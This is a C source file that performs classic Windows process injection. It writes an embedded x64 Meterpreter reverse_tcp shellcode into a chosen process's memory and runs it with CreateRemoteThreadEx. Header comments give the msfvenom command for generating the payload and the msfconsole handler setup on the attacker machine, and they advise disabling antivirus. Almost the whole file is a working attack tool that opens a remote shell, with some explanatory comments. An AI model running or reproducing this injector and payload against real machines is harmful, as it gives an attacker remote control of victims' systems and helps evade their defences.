#include <stdio.h>
#include <windows.h>

/*
Basic Shellcode Injection:
1: Attach to/Create a process. Use (OpenProcess/CreateProcess)
2: Allocate some memory within that process. Use (VirtualAlloc)
3: Write the memory to the process. Use (WriteProcessMemory)
4: Create a thread in the process that will run the code we've embedded in the process memory. Use (CreateRemoteThread)

Before executing this program:
Generate a working shellcode (For example with msfvenom)
(Make sure to use correct shellcodes (Compilation, architecture, etc.)

An example:
msfvenom --platform windows --arch x64 -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT EXIFTUNC=thread -f c --var-name=Shellcode

Setup msfconsole on the attacker machine:
use exploit/multi/handler
set LHOST IP
set LPORT PORT
set payload windows/x64/meterpreter/reverse_tcp
run

Execute the program as Administrator (Disable AV since it will be flagged)
*/

DWORD PIDProcess = NULL;
HANDLE hProcess = NULL;
HANDLE hThread = NULL;
DWORD ThreadID = NULL;
LPVOID MemoryBuffer = NULL;

unsigned char Shellcode[] = 
"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f"
"\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0"
"\x74\x67\x48\x01\xd0\x44\x8b\x40\x20\x49\x01\xd0\x50\x8b"
"\x48\x18\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6"
"\x4d\x31\xc9\x48\x31\xc0\x41\xc1\xc9\x0d\xac\x41\x01\xc1"
"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8"
"\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41\x58\x41\x58"
"\x5e\x48\x01\xd0\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83"
"\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
"\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00"
"\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49"
"\x89\xe5\x49\xbc\x02\x00\x7a\x69\xc0\xa8\x01\x05\x41\x54"
"\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5"
"\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b"
"\x00\xff\xd5\x6a\x0a\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31"
"\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41"
"\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58"
"\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5"
"\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00\x00\x00"
"\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58"
"\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00"
"\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41\x59\x68"
"\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba"
"\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31"
"\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9"
"\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68"
"\x00\x40\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f"
"\x30\xff\xd5\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49"
"\xff\xce\xe9\x3c\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48"
"\x85\xf6\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2"
"\xf0\xb5\xa2\x56\xff\xd5";

int main()
{
//Step 1: Attach to/Create a process. Use (OpenProcess/CreateProcess)
	printf("PID:");
	scanf("%ld", &PIDProcess);
	printf("\n[?] Trying to open a handle to process with PID: %ld\n", PIDProcess);

	//Remember that we should always use less access rights as necessary
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PIDProcess);

	//We won't be able to "Take control" of NT AUTHORITY/System processes, since we won't have enough privileges to access such processes (A specific Error Code will be returned to us by GetLastError())
	if (hProcess == NULL)
	{
		printf("[-] Couldn't get handle to the process with PID %ld. Error: %ld\n", PIDProcess, GetLastError());
		return EXIT_FAILURE;
	}

	printf("[+] Got handle to the process: 0x%p\n", hProcess);

//Step 2: Allocate some memory within that process. Use (VirtualAlloc)
  MemoryBuffer = VirtualAllocEx(hProcess, NULL, sizeof(Shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	//Shellcodes won't be able to be executed if there is a NX/DEP. Same goes if there are not enough privileges, and too many privileges will end up resulting suspicious
	if (MemoryBuffer == NULL)
	{
    printf("[-] Couldn't allocate bytes to process memory. Error: %ld\n", GetLastError());
		return EXIT_FAILURE;
	}

	printf("[+] Memory allocated successfully (%zu bytes) with PAGE_EXECUTE_READWRITE (rwx) permissions\n", sizeof(Shellcode));

//Step 3: Write the memory to the process. Use (WriteProcessMemory)
	BOOL isDone = WriteProcessMemory(hProcess, MemoryBuffer, Shellcode, sizeof(Shellcode), NULL);
	if (isDone == FALSE)
	{
		printf("[-] Wasn't able to write memory to the specified process. Error: %ld\n", GetLastError());
		return EXIT_FAILURE;
	}

	printf("[+] Wrote %zu bytes to the process memory", sizeof(Shellcode));

//Step 4: Create a thread to run our payload
	hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)MemoryBuffer, NULL, 0, 0, ThreadID);

	if (hThread == NULL)
	{
		//Closing Handle Object since there is an error
		CloseHandle(hProcess);
		printf("[-] An error occurred... Error: %ld\n", GetLastError());
		return EXIT_FAILURE;
        }

//To avoid cleaning up while the Shellcode is being executed, we can use WaitForSingleObject()
	WaitForSingleObject(hThread, INFINITE);
	printf("Waiting for the thread to finish executing\n");
	printf("[+] Got a handle to the thread. ThreadID: %ld -- hThread is: 0x%p\n", ThreadID, hThread);
	printf("[+] Closing the handle and the thread which are currently open...\n");
	CloseHandle(hProcess);
	CloseHandle(hThread);
	printf("[+] Closed hProcess and hThread");
	return EXIT_SUCCESS;
}
